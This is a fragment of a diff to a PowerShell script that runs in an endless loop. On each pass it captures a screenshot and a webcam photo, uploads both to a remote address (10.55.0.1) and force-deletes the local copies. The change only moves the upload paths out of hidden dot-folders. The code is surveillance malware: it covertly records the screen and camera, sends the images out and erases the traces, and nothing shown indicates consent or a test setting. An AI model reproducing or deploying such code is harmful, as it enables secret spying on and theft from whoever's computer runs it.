@@ -63,13 +63,13 @@ while ($true) {
     # Screenshot
     $screenFile = "screenshot-$timestamp.png"
     Capture-Screenshot -FilePath $screenFile
-    Upload-File -Url "http://10.55.0.1/uploads/.screen/" -FilePath $screenFile
+    Upload-File -Url "http://10.55.0.1/uploads/" -FilePath $screenFile
     Remove-Item $screenFile -Force
     
     # Webcam photo
     $photoFile = "photo-$timestamp.jpg"
     if (Capture-WebcamPhoto -FilePath $photoFile) {
-        Upload-File -Url "http://10.55.0.1/uploads/.photo/" -FilePath $photoFile
+        Upload-File -Url "http://10.55.0.1/uploads/" -FilePath $photoFile
         Remove-Item $photoFile -Force
     }
     
